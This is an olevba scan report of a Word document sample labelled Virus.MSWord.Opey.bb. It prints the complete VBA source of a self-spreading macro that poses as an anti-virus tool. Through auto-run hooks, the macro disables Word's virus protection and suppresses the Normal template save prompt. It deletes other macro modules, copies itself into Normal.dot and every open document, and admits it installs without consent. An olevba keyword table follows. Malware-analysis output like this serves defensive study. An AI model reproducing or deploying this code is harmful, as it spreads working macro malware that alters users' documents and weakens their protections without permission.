olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.bb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.bb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO JiShenhua33.bas 
in file: Virus.MSWord.Opey.bb - OLE stream: 'Macros/VBA/JiShenhua33'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ------------------------------------------------------------------------------------
' 程序设计: 冀慎华  建行山东省分行
' 日期: 2001年3月
' 功能: 该程序把WORD菜单与工具条初始化到原来状态并删除本模块以外的宏模块.
'-------------------------------------------------------------------------------------
Const CurrentVersion = 33 '版本号
Const myName = "JiShenhua33" '本程序名
Sub AutoExec()
On Error Resume Next
    Call Initialize
    Call Immunize
End Sub
Sub AutoOpen()
On Error Resume Next
   Call Initialize
   Call Immunize
End Sub
Sub FileOpen()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileOpen).Show
    Call Immunize
End Sub
Sub FileSave()
On Error Resume Next
    Call Initialize
    Call Immunize
    If Not ActiveDocument.Saved Then ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Function IsNewDoc(myDoc As Document) As Boolean
    Dim rightPart As String
    If (Left(myDoc.Name, 2) = "文档") Then
        rightPart = Right(myDoc.Name, Len(myDoc.Name) - 2)
        If IsNumeric(rightPart) Then IsNewDoc = True Else IsNewDoc = False
    ElseIf (Left(myDoc.Name, 3) = "Doc") Then
        rightPart = Right(myDoc.Name, Len(myDoc.Name) - 3)
        If IsNumeric(rightPart) Then IsNewDoc = True Else IsNewDoc = False
    Else
        IsNewDoc = False
    End If
End Function
Function Immunize()
On Error Resume Next
    
    Dim ModuleName$, OpenDocImmunized As Boolean
    Dim i%, J%, NmImmunized As Boolean
    Dim myInt As Integer
    Dim openDoc As Document
    
    NmImmunized = False
    For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
        ModuleName = NormalTemplate.VBProject.VBComponents(i).Name
        Select Case ModuleName
        Case "ThisDocument"
            myInt = NormalTemplate.VBProject.VBComponents(i).CodeModule.CountOfLines
            If myInt > 0 Then
                NormalTemplate.VBProject.VBComponents(i).CodeModule.DeleteLines 1, myInt
            End If
        Case "MyTools"
        Case "VirusReport", "JiShenhua" '旧版本杀病毒程序
            Application.OrganizerDelete _
                Source:=NormalTemplate.FullName, _
                Name:=ModuleName, _
                Object:=wdOrganizerObjectProjectItems
        Case Else
            If Left(ModuleName, 9) = "JiShenhua" Then '本程序
                myInt = Val(Right(ModuleName, 2))
                If myInt < CurrentVersion Then '当前程序的旧版本
                    Application.OrganizerDelete _
                        Source:=NormalTemplate.FullName, _
                        Name:=ModuleName, _
                        Object:=wdOrganizerObjectProjectItems
                Else
                    NmImmunized = True '是当前版本或更高版本程序
                End If
            Else '其他程序
                msg = "你的 Word 系统中附带有宏程序模块 " + ModuleName + _
                    ", 极有可能是宏病毒,请选择 '是' 清除该病毒."
                If MsgBox(msg, vbYesNo, "冀慎华向您报告:") = vbYes Then
                    Application.OrganizerDelete _
                        Source:=NormalTemplate.FullName, _
                        Name:=ModuleName, _
                        Object:=wdOrganizerObjectProjectItems
                End If
            End If
        End Select
    Next i
    
    For Each openDoc In Documents
        OpenDocImmunized = False
        For J = openDoc.VBProject.VBComponents.Count To 1 Step -1
            ModuleName = openDoc.VBProject.VBComponents(J).Name
            Select Case ModuleName
                Case "ThisDocument"
                    myInt = openDoc.VBProject.VBComponents(J).CodeModule.CountOfLines
                    If myInt > 0 Then
                        openDoc.VBProject.VBComponents(J).CodeModule.DeleteLines 1, myInt
                    End If
                Case "Reference to Normal", "MyTools"
                Case "VirusReport", "JiShenhua" '旧版本杀病毒程序
                    Application.OrganizerDelete _
                        Source:=openDoc.FullName, _
                        Name:=ModuleName, _
                        Object:=wdOrganizerObjectProjectItems
                Case Else
                    If Left(ModuleName, 9) = "JiShenhua" Then '本程序
                        myInt = Val(Right(ModuleName, 2))
                        If myInt < CurrentVersion Then '当前程序的旧版本
                            Application.OrganizerDelete _
                                Source:=openDoc.FullName, _
                                Name:=ModuleName, _
                                Object:=wdOrganizerObjectProjectItems
                        Else
                            OpenDocImmunized = True '是当前版本或更高版本程序
                        End If
                    Else '有其他模块存在
                        msg = "您的文件 <" + openDoc.Name + "> 中附带有 Word 宏模块 " + ModuleName + _
                            ", 极有可能是宏病毒,请选择 '是' 清除该病毒."
                        If MsgBox(msg, vbYesNo, "冀慎华向您报告:") = vbYes Then
                            Application.OrganizerDelete _
                                Source:=openDoc.FullName, _
                                Name:=ModuleName, _
                                Object:=wdOrganizerObjectProjectItems
                        End If
                    End If
            End Select
        Next J
        '向打开的文档中写入本程序
        If Not OpenDocImmunized Then
            Application.OrganizerCopy Source:=NormalTemplate.FullName, _
                Destination:=openDoc.FullName, Name:=myName, _
                Object:=wdOrganizerObjectProjectItems
            If (Not IsNewDoc(openDoc)) And (Not openDoc.Saved) Then
                openDoc.Save
            End If
        End If
    Next openDoc
    '向Normal中写入本程序
    If Not NmImmunized Then
        Application.OrganizerCopy _
            Source:=ActiveDocument.FullName, _
            Destination:=NormalTemplate.FullName, _
            Name:=myName, _
            Object:=wdOrganizerObjectProjectItems
        If Not NormalTemplate.Saved Then NormalTemplate.Save
    End If
End Function
Function Initialize()
On Error Resume Next
   
   Application.DisplayAlerts = wdAlertsAll
   WordBasic.DisableAutoMacros False
   
    With Application
        .UserAddress = "冀慎华已为您的机器安装了反宏病毒程序(v33),事前未征求您的同意,请见谅."
    End With
    
    With Dialogs(wdDialogFileSummaryInfo)
        .Comments = "该文件附带有冀慎华编写的反宏病毒程序(v33)."
        .Execute
    End With
    
    With Options
        .ConfirmConversions = True
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    
   With CommandBars("Visual Basic")
      .Enabled = True
      .Protection = msoBarTypeMenuBar
      .Protection = msoBarMenuBar
   End With
   
   With CommandBars("Tools")
      .Reset
      .Controls("Macro").Reset
      .Controls("Customize...").Reset
   End With
   
   FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Clear
   FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Clear
   CustomizationContext = NormalTemplate
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

